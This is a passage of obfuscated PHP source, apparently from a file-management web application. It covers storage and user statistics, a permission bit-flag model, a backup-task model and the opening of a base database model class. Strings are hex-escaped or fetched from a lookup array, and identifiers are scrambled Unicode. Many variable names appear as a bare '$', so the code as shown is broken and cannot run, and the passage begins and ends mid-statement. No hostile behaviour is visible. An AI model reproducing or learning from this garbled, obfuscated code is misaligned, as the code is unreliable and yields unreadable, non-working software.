$this->{$}($ߨ); } return $this->listData(); } private function dateList($Ë) { $ =& $_SERVER[ܮ]; $ݝ = $Ë; $锉 = strtotime($[2123]); $ = array(); while ($ݝ <= $锉) { $[] = date($[2122], $ݝ); $ݝ = strtotime($[2125], $ݝ); } return $; } public function _recordUser($﮽ = '') { $ͪ =& $_SERVER[ܮ]; if (!$﮽) { return 0; } $ = strtotime(date($ͪ[2126], strtotime($﮽))); $ڵ = strtotime(date($ͪ[2127], strtotime($﮽))); $ؤ = array($ͪ[231] => array($ͪ[1181], $ڵ)); $ǅ = Model($ͪ[617])->where($ؤ)->count($ͪ[1593]); $ؤ[$ͪ[231]] = array($ͪ[408], array($, $ڵ)); $ϻ = Model($ͪ[617])->where($ؤ)->count($ͪ[1593]); $ؤ[$ͪ[33]] = $ͪ[2128]; $Ɣ = Model($ͪ[2129])->where($ؤ)->count($ͪ[2130]); $ = array($ͪ[282] => $﮽, $ͪ[864] => (int) $ǅ, $ͪ[2115] => (int) $ϻ, $ͪ[2116] => (int) $Ɣ); return $this->insert($); } public function _recordStore($ϲ = '') { $͌ =& $_SERVER[ܮ]; if (!$ϲ) { return 0; } $ѐ = strtotime(date($͌[2127], strtotime($ϲ))); $ = array($͌[231] => array($͌[1181], $ѐ)); $ = Model($͌[560])->where($)->sum($͌[79]); $؏ = "\123\105\114\105\x43\x54\40\12\40\x20\x20\x20\x20\40\40\40\40\x20\40\x20\x20\40\40\x20\x53\125\115\x28\x60\x73\151\172\x65\140\x29\x20\101\123\x20\163\151\172\x65\x54\x6f\x74\x61\154\54\xa\x20\x20\x20\x20\x20\40\x20\40\x20\40\x20\40\x20\40\x20\40\x53\125\115\x28\103\x41\x53\105\40\x57\110\105\x4e\40\x60\164\141\162\x67\145\x74\x54\x79\160\x65\x60\40\75\x20\x31\40\x54\110\x45\x4e\x20\x60\x73\x69\172\145\x60\x20\x45\x4c\x53\x45\x20\x30\x20\x45\116\104\x29\x20\x41\123\x20\x73\151\172\x65\x55\163\x65\162\x2c\xa\x20\40\40\x20\40\x20\40\x20\40\x20\x20\x20\40\40\40\40\x53\x55\x4d\x28\x43\101\123\x45\40\x57\110\x45\x4e\x20\140\164\x61\x72\x67\145\x74\124\x79\160\145\x60\x20\x3d\x20\x32\40\x54\x48\105\116\40\x60\x73\x69\172\x65\x60\x20\x45\x4c\123\x45\x20\x30\40\x45\116\104\51\x20\x41\123\x20\x73\x69\172\145\107\162\157\x75\160\12\40\40\40\40\x20\40\40\40\40\x20\x20\40\x20\x20\40\40\106\x52\117\115\40\x60\x69\157\137\163\157\165\162\143\x65\140\40\xa\40\40\x20\x20\40\40\x20\40\x20\x20\x20\40\40\x20\x20\40\x57\x48\105\x52\105\40\x60\151\163\106\x6f\x6c\x64\145\x72\x60\x20\x3d\x20\60\x20\x41\x4e\104\40\140\x63\162\x65\141\164\x65\124\151\x6d\x65\x60\x20\x3c\75\x20{$ѐ}"; $ = Model($͌[939])->query($؏); $ٮ = array($͌[282] => $ϲ, $͌[862] => (int) (isset($[0][$͌[862]]) ? $[0][$͌[862]] : 0), $͌[2119] => (int) $, $͌[2120] => (int) (isset($[0][$͌[2120]]) ? $[0][$͌[2120]] : 0), $͌[2121] => (int) (isset($[0][$͌[2121]]) ? $[0][$͌[2121]] : 0)); return $this->insert($ٮ); } public function trend($ˡڭ, $몷߸) { $윋ȳ =& $_SERVER[ܮ]; if (!$this->init($ˡڭ)) { return !1; } $ = $this->trendList($ˡڭ); if ($ && $몷߸ != $윋ȳ[1950]) { $喒 = $[0][$윋ȳ[282]]; $ň = $this->validDate($몷߸, $喒); $΂ = array(); $ = array_to_keyvalue($, $윋ȳ[282]); foreach ($ň as $Ϳ) { if (isset($[$Ϳ])) { $ = $[$Ϳ]; } else { $ = end($); $[$윋ȳ[282]] = $Ϳ; if ($ˡڭ == $윋ȳ[684]) { $[$윋ȳ[2115]] = $[$윋ȳ[2116]] = 0; } } $΂[] = $; } $ = $΂; } $涪 = array($윋ȳ[684] => array($윋ȳ[864] => LNG($윋ȳ[2131]), $윋ȳ[2115] => LNG($윋ȳ[2132]), $윋ȳ[2116] => LNG($윋ȳ[2133])), $윋ȳ[2117] => array($윋ȳ[862] => LNG($윋ȳ[2134]), $윋ȳ[2119] => LNG($윋ȳ[2135]), $윋ȳ[2120] => LNG($윋ȳ[2136]), $윋ȳ[2121] => LNG($윋ȳ[2137]))); $٠ü = array($윋ȳ[684] => $윋ȳ[956], $윋ȳ[2117] => $윋ȳ[79]); if (empty($)) { $Ϳ = date($윋ȳ[2122], strtotime($윋ȳ[2123])); $ϥ = array($윋ȳ[282] => $Ϳ); foreach ($涪[$ˡڭ] as $ => $݁) { $ϥ[$] = 0; } $[] = $ϥ; } $ = array(); foreach ($ as $݁) { if ($ˡڭ == $윋ȳ[2117] && $݁[$윋ȳ[2119]] > $݁[$윋ȳ[862]]) { $݁[$윋ȳ[2119]] = $݁[$윋ȳ[862]]; } foreach ($涪[$ˡڭ] as $ => $) { $ = array($윋ȳ[282] => $݁[$윋ȳ[282]], $윋ȳ[1866] => $); $[$٠ü[$ˡڭ]] = isset($݁[$]) ? $݁[$] : 0; $[] = $; } } return $; } public function validDate($ۮ, $㟔) { $֟ =& $_SERVER[ܮ]; $ۋ = date($֟[2122], strtotime($֟[2123])); $ = array($ۋ); switch ($ۮ) { case $֟[1957]: $ = mktime(0, 0, 0, date($֟[2138]), date($֟[1660]) - date($֟[1746]) + 7 - 7, date($֟[2139])); $ⴉ = 0; do { $ = date($֟[2122], $ - 3600 * 24 * 7 * $ⴉ); $[] = $; $ⴉ++; } while ($㟔 < $); break; case $֟[1955]: $ⴉ = 1; do { $❭ = date($֟[2140], strtotime("\x2d\40{$ⴉ}\x20\x6d\x6f\156\x74\150\163")); $[] = $❭; $ⴉ++; } while ($㟔 < $❭); break; case $֟[2141]: $顀 = (int) date($֟[2139], strtotime($㟔)); $ٖ = (int) date($֟[2139]); if ($顀 >= $ٖ) { break; } for ($顀; $顀 < $ٖ; $顀++) { $[] = $顀 . $֟[2142]; } break; default: break; } if ($㟔 > end($)) { array_pop($); } sort($); return $; } public function listTable($՘؞) { $ܭ־ = ucfirst($՘؞); return Model($ܭ־)->listData(); } public function option($δ) { return call_user_func_array(array($this, $_SERVER[ܮ][2143] . ucfirst($δ)), array()); } private function optionUser() { $ٿ =& $_SERVER[ܮ]; $̢¯ = Model($ٿ[617])->count($ٿ[1593]); $ž = Model($ٿ[617])->where($ٿ[2144])->count($ٿ[1593]); $ = intval($GLOBALS[$ٿ[6]][$ٿ[424]][$ٿ[1924]]) / 3600; $ = strtotime("\x2d{$}\x20\x68\157\165\162\x73"); $ = strtotime(date($ٿ[2126])); if ($ < $) { $ = $; } $ = array($ٿ[2145] => array($ٿ[1182], $)); $Ӊ = (int) Model($ٿ[617])->where($)->count($ٿ[1593]); if (!$Ӊ) { $Ӊ = 1; } $ = array($ٿ[2145] => array($ٿ[1182], $)); $ = Model($ٿ[617])->where($)->count($ٿ[1593]); return array($ٿ[857] => (int) $̢¯, $ٿ[2146] => (int) ($̢¯ - $ž), $ٿ[2147] => (int) $ž, $ٿ[2148] => (int) $, $ٿ[2149] => $Ӊ); } private function optionFile() { $ƥʜ =& $_SERVER[ܮ]; $ = $this->sourceSize(); $ = array($ƥʜ[500] => 0); $և = Model($ƥʜ[939])->where($)->count(); $[$ƥʜ[231]] = array($ƥʜ[1182], strtotime(date($ƥʜ[2126]))); $ͯ = Model($ƥʜ[939])->where($)->field(array($ƥʜ[955] => $ƥʜ[956], $ƥʜ[957] => $ƥʜ[79]))->find(); $ƾ = array($ƥʜ[862] => $[$ƥʜ[79]], $ƥʜ[2119] => $[$ƥʜ[2119]], $ƥʜ[2150] => $[$ƥʜ[79]] - $[$ƥʜ[2119]], $ƥʜ[2151] => (int) (isset($ͯ[$ƥʜ[79]]) ? $ͯ[$ƥʜ[79]] : 0), $ƥʜ[864] => (int) $և, $ƥʜ[2152] => (int) (isset($ͯ[$ƥʜ[956]]) ? $ͯ[$ƥʜ[956]] : 0)); if ($ƾ[$ƥʜ[2150]] < 0) { $ƾ[$ƥʜ[2150]] = 0; } return $ƾ; } private function optionAccess() { $쾳 =& $_SERVER[ܮ]; return array($쾳[857] => $this->typeLogCnt(), $쾳[107] => $this->typeLogCnt($쾳[107]), $쾳[539] => $this->typeLogCnt($쾳[539]), $쾳[1334] => $this->typeLogCnt($쾳[1334]), $쾳[1562] => $this->typeLogCnt($쾳[1562]), $쾳[684] => $this->typeLogCnt($쾳[12], $쾳[2130])); } private function typeLogCnt($ = '', $Ɛ = "\x69\x64") { $пѕ =& $_SERVER[ܮ]; $ = array($пѕ[107] => array($пѕ[2153], $пѕ[2154]), $пѕ[539] => array($пѕ[2155], $пѕ[2156]), $пѕ[1334] => array($пѕ[2157], $пѕ[2158], $пѕ[2159]), $пѕ[1562] => array($пѕ[2160], $пѕ[2161]), $пѕ[1563] => array($пѕ[2162], $пѕ[2163], $пѕ[2164])); $ = strtotime(date($пѕ[2126])); $θ = array($пѕ[231] => array($пѕ[1182], $)); if ($) { $θ[$пѕ[33]] = array($пѕ[7], $[$]); } $ܸ = Model($пѕ[2129])->where($θ)->count($Ɛ); return (int) $ܸ; } private function optionServer() { $̺ =& $_SERVER[ܮ]; $ = $this->diskDriver(); $ = KodIO::defaultDriver(); $ȝƺ = array($̺[932] => $[$̺[487]]); $ = Model($̺[560])->where($ȝƺ)->sum($̺[79]); $ϧ = explode($̺[53], $_SERVER[$̺[144]]); $ = $ϧ[0]; $ʊ = $GLOBALS[$̺[6]][$̺[21]]; $¥ = $ʊ[$̺[1144]]; if ($¥ == $̺[1132]) { $ = explode($̺[1474], $ʊ[$̺[1143]]); $¥ = $[0]; } if ($¥ == $̺[1077] || $¥ == $̺[907]) { $ʷ = Model()->db()->query($̺[2165]); $Ύ = $ʷ[0] && isset($ʷ[0][$̺[1865]]) ? $ʷ[0][$̺[1865]] : 0; $¥ = $̺[2166] . ($Ύ ? $̺[8] . $Ύ : $̺[12]); } $ = $GLOBALS[$̺[6]][$̺[424]][$̺[986]]; return array($̺[2167] => $ ? $[$̺[2168]] : 0, $̺[2169] => $ ? $[$̺[2170]] : 0, $̺[2171] => (int) $[$̺[2168]] * 1024 * 1024 * 1024, $̺[2172] => (int) $, $̺[2173] => ucfirst($), $̺[2174] => $̺[2175] . PHP_VERSION, $̺[2176] => phpBuild64() ? 64 : 32, $̺[856] => str_replace($̺[1308], $̺[1160], $¥), $̺[424] => ucfirst($), $̺[32] => $_SERVER[$̺[2177]]); } private function diskDriver() { $ƥ =& $_SERVER[ܮ]; $ذƓР = $ƥ[8]; $Ӧ = $GLOBALS[$ƥ[6]][$ƥ[1498]] == $ƥ[1499]; if ($Ӧ) { $ذƓР = $ƥ[2178]; if (function_exists($ƥ[2179])) { exec($ƥ[2180], $); $ذƓР = $[1] . $ƥ[8]; } } if (!file_exists($ذƓР)) { return; } if (!function_exists($ƥ[2181])) { return; } $ = @disk_total_space($ذƓР); $ = $ - @disk_free_space($ذƓР); return array($ƥ[2168] => $, $ƥ[2170] => $); } public function fileChart($ǒݚ) { $ =& $_SERVER[ܮ]; $̽ = Model($[939]); if (isset($ǒݚ[$[1593]])) { return $̽->userFileTypeProfile($ǒݚ[$[1593]]); } if (isset($ǒݚ[$[1496]])) { return $̽->groupFileTypeProfile($ǒݚ[$[1496]]); } $ނ = $this->sourceSize(); return array($[862] => $ނ[$[79]], $[2119] => $ނ[$[2119]], $[2120] => $̽->where(array($[188] => 1, $[190] => 0))->sum($[79]), $[2121] => $̽->where(array($[188] => 2, $[190] => 0))->sum($[79])); } private function sourceSize() { $ԅ =& $_SERVER[ܮ]; $ = Model($ԅ[939])->where(array($ԅ[500] => 0))->sum($ԅ[79]); $ = Model($ԅ[2182])->sum($ԅ[79]); $ = Model($ԅ[560])->sum($ԅ[79]); return array($ԅ[79] => (int) $ + (int) $, $ԅ[2119] => (int) $); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ =& $_SERVER[ܮ]; $ղ = array(array($[509] => LNG($[2183]), $[2184] => $[2185], $[2186] => 1, $[2187] => 1, $[2188] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($[509] => LNG($[2189]), $[2184] => $[2190], $[2186] => 2, $[2187] => 1, $[2188] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($[509] => LNG($[2191]), $[2184] => $[2192], $[2186] => 3, $[2187] => 1, $[2188] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($[509] => LNG($[2193]), $[2184] => $[2194], $[2186] => 4, $[2187] => 1, $[2188] => self::AUTH_SHOW | self::AUTH_VIEW), array($[509] => LNG($[2195]), $[2184] => $[2196], $[2186] => 5, $[2187] => 1, $[2188] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($[509] => LNG($[2197]), $[2184] => $[2198], $[2186] => 6, $[2187] => 1, $[2188] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($[509] => LNG($[2199]), $[2184] => $[2200], $[2186] => 7, $[2187] => 1, $[2188] => 0)); return $ղ; } public static function authCheck($, $ۓѧ, $ = true) { $ =& $_SERVER[ܮ]; $ = intval($); if ($) { if (KodUser::isRoot() && $GLOBALS[$[6]][$[2201]]) { return !0; } } if ($ <= 0) { return !1; } if (($ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ & $ۓѧ); } public static function authCheckShow($؎) { return self::authCheck($؎, self::AUTH_SHOW); } public static function authCheckView($Ж) { return self::authCheck($Ж, self::AUTH_VIEW); } public static function authCheckDownload($Κ) { return self::authCheck($Κ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Խ) { return self::authCheck($Խ, self::AUTH_UPLOAD); } public static function authCheckEdit($ķ) { return self::authCheck($ķ, self::AUTH_EDIT); } public static function authCheckRemove($) { return self::authCheck($, self::AUTH_REMOVE); } public static function authCheckShare($£) { return self::authCheck($£, self::AUTH_SHARE); } public static function authCheckComment($ֿ̈́) { return self::authCheck($ֿ̈́, self::AUTH_COMMENT); } public static function authCheckEvent($) { return self::authCheck($, self::AUTH_EVENT); } public static function authCheckRoot($꓂պ) { return self::authCheck($꓂պ, self::AUTH_ROOT); } public static function authCheckAction($٩, $ԉ̓) { $ =& $_SERVER[ܮ]; $ = array($[1560] => self::AUTH_SHOW, $[1561] => self::AUTH_VIEW, $[1386] => self::AUTH_DOWNLOAD, $[107] => self::AUTH_UPLOAD, $[1562] => self::AUTH_EDIT, $[1334] => self::AUTH_REMOVE, $[1563] => self::AUTH_SHARE, $[429] => self::AUTH_COMMENT, $[1564] => self::AUTH_EVENT, $[1565] => self::AUTH_ROOT); if (!isset($[$ԉ̓])) { return; } $ = $[$ԉ̓]; $٩ = intval($٩); if ($٩ <= 0) { return !1; } if (($٩ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($٩ & $); } public static function authDisable($մ, $Գ) { if (intval($մ) <= 0) { return 0; } return intval($մ) & ~$Գ; } public $optionType = "\123\x79\x73\164\145\x6d\x2e\163\x6f\165\x72\x63\145\x41\x75\x74\150\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\x61\165\164\x68", "\x6c\141\x62\x65\x6c", "\x64\x69\163\160\x6c\x61\x79", "\163\x79\x73\x74\145\155", "\x73\x6f\162\164"); public function initData() { $ɑ = $this->authDefault(); foreach ($ɑ as $ą) { $this->add($ą); } } public function findAuth($Ӑ, $ʞҬ) { $ι =& $_SERVER[ܮ]; $ = parent::listData(); foreach ($ as $ߑʏ) { $ = intval($ߑʏ[$ι[502]]); if ($ <= 0 || $ߑʏ[$ι[2202]] == 0) { continue; } if (($ & $Ӑ) != $Ӑ) { continue; } if (($ & $ʞҬ) != 0) { continue; } return $ߑʏ[$ι[487]]; } return !1; } public function findAuthMax($, $ӭ) { $練ϱ =& $_SERVER[ܮ]; $ = !1; $ = parent::listData(); foreach ($ as $і) { $­ = intval($і[$練ϱ[502]]); if ($­ <= 0 || $і[$練ϱ[2202]] == 0) { continue; } if (($­ & $) != $) { continue; } if (($­ & $ӭ) != 0) { continue; } if (!$) { $ = $і; continue; } if (intval($[$練ϱ[502]]) < $­) { $ = $і; } } return $ ? $[$練ϱ[487]] : !1; } public function findAuthReadOnly() { $ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $􎖵 = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($, $􎖵); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ =& $_SERVER[ܮ]; $ = parent::listData(); $ޭ = !1; foreach ($ as $ĸ) { if ($ĸ[$[502]] <= 0 || $ĸ[$[2202]] == $[228]) { continue; } if (!$ޭ) { $ޭ = $ĸ; continue; } if ($ޭ[$[502]] > $ĸ[$[502]]) { $ޭ = $ĸ; } } return $ޭ ? $ޭ[$[487]] : $[12]; } public function listData($뱙 = false, $φ = "\163\157\x72\x74", $ = false) { return parent::listData($뱙, $φ, $); } public function update($ː, $) { $ =& $_SERVER[ܮ]; $՞ = parent::listData($ː); $ = $this->findByName($[$[32]]); if (!$՞ || $ && $[$[487]] != $՞[$[487]]) { return !1; } $this->filterAuth($[$[502]]); return parent::update($ː, $); } public function remove($) { $ި = parent::listData($); if (!$ި || $ި[$_SERVER[ܮ][189]]) { return !1; } return parent::remove($); } public function add($ = array()) { $ԅ =& $_SERVER[ܮ]; if ($this->findByName($[$ԅ[32]])) { return !1; } $̾ = array($ԅ[32] => $ԅ[12], $ԅ[502] => 1, $ԅ[2203] => $ԅ[2192], $ԅ[2202] => 1, $ԅ[189] => 0, $ԅ[2204] => 0); $ = array_merge($̾, $); $[$ԅ[2204]] = $this->getSort(); $this->filterAuth($[$ԅ[502]]); return parent::insert($); } private function getSort() { $ =& $_SERVER[ܮ]; $ր = parent::listData(); $ծ = array_to_keyvalue($ր, $[12], $[2204]); return empty($ծ) ? 0 : max($ծ) + 1; } private function filterAuth(&$) { if (!$) { return; } $϶ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ﺒ = array(); foreach ($϶ as $뿸) { if ($ & $뿸) { $ﺒ[] = $뿸; } } if (in_array(self::AUTH_ROOT, $ﺒ)) { $ = array_sum($϶); return; } $ݮ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ﺒ as $뿸) { if (isset($ݮ[$뿸])) { $ﺒ = array_merge($ﺒ, $ݮ[$뿸]); } } $ﺒ[] = self::AUTH_SHOW; $ = array_sum(array_unique($ﺒ)); } public function sort($ؚ, $Θ) { return parent::update($ؚ, $Θ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\142\141\143\153\x75\160\114\x69\x73\x74"; public $field = array("\151\157", "\x6e\141\x6d\145", "\163\164\141\x74\165\163", "\x63\x6f\156\x74\145\156\x74", "\155\141\x6e\165\x61\154", "\x72\145\163\165\x6c\164", "\x74\151\155\x65\x46\162\x6f\x6d", "\164\151\x6d\145\124\157"); public $autoTask = "\141\144\x6d\151\x6e\x2e\142\x61\143\x6b\x75\x70\x2e\x61\165\x74\157\x54\x61\163\153"; public $fileTask = "\141\x64\155\x69\x6e\x2e\x62\x61\x63\153\165\x70\56\146\x69\154\145\x54\x61\x73\x6b"; public function config($ = false) { $ѧ =& $_SERVER[ܮ]; $ = $this->configSimple(); Action($ѧ[2205])->taskInit($); if (!$) { return $; } $ʯ = array(); if (Model($ѧ[871])->get($ѧ[2206], $ѧ[877]) == $ѧ[2207]) { Model($ѧ[1946])->cacheClear(); $ʯ = Model($ѧ[2208])->findByKey($ѧ[1564], $this->autoTask); if (!$ʯ) { $ʯ = array(); } if (isset($ʯ[$ѧ[204]])) { $ʯ[$ѧ[204]] = json_decode($ʯ[$ѧ[204]], !0); } if (isset($[$ѧ[204]])) { $ʯ[$ѧ[204]][$ѧ[1950]] = $[$ѧ[204]]; unset($[$ѧ[204]]); } } $ = array_merge($ʯ, $); if ($[$ѧ[168]] == $ѧ[950]) { $ = Model($ѧ[871])->get($ѧ[949], $ѧ[877]); $[$ѧ[2209]] = json_decode($, !0); } return $; } public function configSimple() { $ =& $_SERVER[ܮ]; $򮽟 = Model($[871])->get($[877]); $򮽟 = json_decode($򮽟, !0); if (!$򮽟) { $򮽟 = array($[1947] => 0); } $򮽟[$[1947]] = _get($򮽟, $[1947], 1); $this->parseContent($򮽟); if ($򮽟[$[168]] == $[950] && Model($[871])->get($[967]) == $[968]) { $򮽟[$[168]] = $[1308]; } return $򮽟; } public function listData($ñ = false, $֛ = "\155\157\x64\151\x66\171\124\x69\155\145", $ = false) { $ = parent::listData($ñ, $֛, !0); if (!$) { return $; } if ($ñ) { $ = array($); } foreach ($ as &$޵) { $this->parseContent($޵); } return $ñ ? $[0] : $; } public function parseContent(&$ǥ) { $㫳 =& $_SERVER[ܮ]; $Ы = _get($ǥ, $㫳[168], $㫳[91]); if (!in_array($Ы, array($㫳[950], $㫳[1308]))) { $ǥ[$㫳[168]] = $Ы == $㫳[91] ? $㫳[1308] : $㫳[950]; } } public function lastItem() { $ = $this->listData(); return !empty($[0]) ? $[0] : null; } public function kill($Ý) { $҅ =& $_SERVER[ܮ]; $ɷť = $this->listData($Ý); if (!$ɷť || empty($ɷť[$҅[32]])) { return !0; } Task::kill($҅[884]); Task::kill($҅[912]); Task::kill($҅[923]); $ = $ɷť[$҅[32]]; $Ϊ = TEMP_FILES . $҅[880] . $ . $҅[8]; IO::remove($Ϊ, !1); return $this->remove($Ý); } public function remove($ܙ˴) { $ = $this->listData($ܙ˴); if (!$) { return !0; } return $this->backupRemove($); } private function backupRemove($ټ) { parent::remove($ټ[$_SERVER[ܮ][487]]); $֛ۂ = $this->backupPath($ټ); IO::remove($֛ۂ, !1); return !0; } private function backupPath($) { $׀ض =& $_SERVER[ܮ]; $ĩ = $[$׀ض[32]]; $ = Model($׀ض[871])->get($׀ض[872]); $̹햋 = substr(md5($׀ض[873] . $ . $ĩ), 0, 8); return "\x7b\x69\x6f\72{$[$׀ض[850]]}\x7d\x2f\144\141\164\x61\142\141\163\x65\x2f\142\x61\143\153\165\160\x2f" . $ĩ . $׀ض[11] . $̹햋; } public function start($Դ = "\x64\142") { $׊ =& $_SERVER[ܮ]; if ($GLOBALS[$׊[6]][$׊[92]][$׊[2210]] != $׊[91]) { return !0; } $񉛉 = $this->configSimple(); if (!$񉛉 || $񉛉[$׊[1947]] != $׊[91]) { return !1; } if ($Դ == $׊[230]) { return $this->bakFile($񉛉); } $ = $this->process(); foreach ($ as $) { if ($) { return Task::restart($[$׊[487]]); } } $ⷧ = new Backup(); if (!$ⷧ || $ⷧ->message) { return !1; } $ޅ = $ⷧ->db(); if ($ޅ) { $ޅ = $ⷧ->dbFile(); if ($ޅ && $񉛉[$׊[168]] == $׊[950]) { $ޅ = $ⷧ->file(); } } Backup::set(array($׊[848] => 1, $׊[860] => time())); return !0; } public function process() { $Ž̊ =& $_SERVER[ܮ]; $ג = array($Ž̊[856] => Task::get($Ž̊[884]), $Ž̊[861] => Task::get($Ž̊[912]), $Ž̊[230] => Task::get($Ž̊[923])); $ӊ = !1; foreach ($ג as &$) { if ($ӊ) { $ = !1; continue; } if ($) { $ީ = intval(_get($, $Ž̊[1981], 0)); if (time() - $ީ > 7200) { Task::kill($[$Ž̊[487]]); $ӊ = !0; $ = !1; } } } return $ג; } public function bakFile($˯ܤ) { $ =& $_SERVER[ܮ]; if ($˯ܤ[$[168]] == $[1308]) { return !1; } Model($[1946])->cacheClear(); $ₜ = Model($[2208])->findByKey($[1564], $this->fileTask); if (!$ₜ) { return !1; } $䱚 = json_decode($ₜ[$[204]], !0); if (!$䱚 || $䱚[$[33]] != $[1959]) { return !1; } $䱚 = intval($䱚[$[1959]]); if ($䱚 <= 0) { return !1; } $ = new BackupFile(!0); return $->start($˯ܤ[$[850]], $䱚); } public function restore() { $ =& $_SERVER[ܮ]; ActionCall($[2211], !0, 1); ActionCall($[2211], !0, 0); } } goto F՗; f쬣: define($_SERVER[ܮ][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\157\x72\144\x65\162", "\141\x6c\151\141\x73", "\150\x61\166\151\x6e\147", "\147\x72\x6f\x75\160", "\x6c\x6f\143\x6b", "\144\151\x73\x74\151\156\x63\164", "\141\165\x74\x6f", "\x66\x69\x6c\x74\145\162", "\x76\x61\154\x69\144\141\x74\x65", "\x72\145\163\165\x6c\164", "\x62\151\x6e\144", "\x74\x6f\153\145\x6e"); public function __construct($Ĕ = '', $ = '', $г = '') { $ =& $_SERVER[ܮ]; $this->_initialize(); if (!empty($Ĕ)) { if (strpos($Ĕ, $[10])) { list($this->dbName, $this->name) = explode($[10], $Ĕ); } else { $this->name = $Ĕ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($)) { $this->tablePrefix = $[12]; } elseif ($[12] != $) { $this->tablePrefix = $; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($[321]); } $this->db(0, empty($this->connection) ? $г : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ԙ =& $_SERVER[ܮ]; if (empty($this->fields)) { if (think_config($ԙ[322])) { $֞ = $this->dbName ? $this->dbName : think_config($ԙ[323]); $ = think_var_cache($ԙ[324] . strtolower(get_path_this($֞) . $ԙ[10] . $this->name)); if ($) { $ = think_config($ԙ[325]); if (empty($) || $[$ԙ[326]] == $) { $this->fields = $; return; } } } $this->flush(); } } public function flush() { $쪍 =& $_SERVER[ܮ]; $this->db->setModel($this->name); $ = $this->db->getFields($this->getTableName()); if (!$) { return !1; } $this->fields = array_keys($); $this->fields[$쪍[327]] = !1; foreach ($ as $ٸ => $Ȕ) { $Ə[$ٸ] = $Ȕ[$쪍[33]]; if ($Ȕ[$쪍[39]]) { $this->fields[$쪍[328]] = $ٸ; if ($Ȕ[$쪍[42]]) { $this->fields[$쪍[327]] = !0; } } } $this->fields[$쪍[329]] = $Ə; if (think_config($쪍[325])) { $this->fields[$쪍[326]] = think_config($쪍[325]); } if (think_config($쪍[322])) { $ = $this->dbName ? $this->dbName : think_config($쪍[323]); think_var_cache($쪍[324] . strtolower(get_path_this($) . $쪍[10] . $this->name), $this->fields); } } public function switchModel($ǲ, $ބ = array()) { $Ŝ =& $_SERVER[ܮ]; $ = ucwords(strtolower($ǲ)) . $Ŝ[330]; if (!class_exists($)) { think_exception($ . think_lang($Ŝ[331])); } $this->_extModel = new $($this->name); if (!empty($ބ)) { foreach ($ބ as $) { $this->_extModel->setProperty($, $this->{$}); } } return $this->_extModel; } public function __set($, $ت) { $this->data[$] = $ت; } public function __get($) { return isset($this->data[$]) ? $this->data[$] : null; } public function __isset($) { return isset($this->data[$]); } public function __unset($ֽ) { unset($this->data[$ֽ]); } public function __call($, $ԋ) { $ =& $_SERVER[ܮ]; if (in_array(strtolower($), $this->methods, !0)) { $this->options[strtolower($)] = $ԋ[0]; return $this; } elseif (in_array(strtolower($), array($[332], $[333], $[334], $[335], $[336]), !0)) { $Ɛ = isset($ԋ[0]) ? $ԋ[0] : $[220]; $Ɛ = $this->db->parseKey($Ɛ); return $this->getField(strtoupper($) . $[337] . $Ɛ . $[338] . $, $[332]); } elseif (strtolower(substr($, 0, 5)) == $[339]) { $Ɛ = think_parse_name(substr($, 5)); $ͬ߻[$Ɛ] = $ԋ[0]; return $this->where($ͬ߻)->find(); } elseif (strtolower(substr($, 0, 10)) == $[340]) { $ = think_parse_name(substr($, 10)); $ͬ߻[$] = $ԋ[0]; return $this->where($ͬ߻)->getField($ԋ[1]); } elseif (isset($this->_scope[$])) { return $this->scope($, $ԋ[0]); } elseif (method_exists($this, $) || method_exists($this, 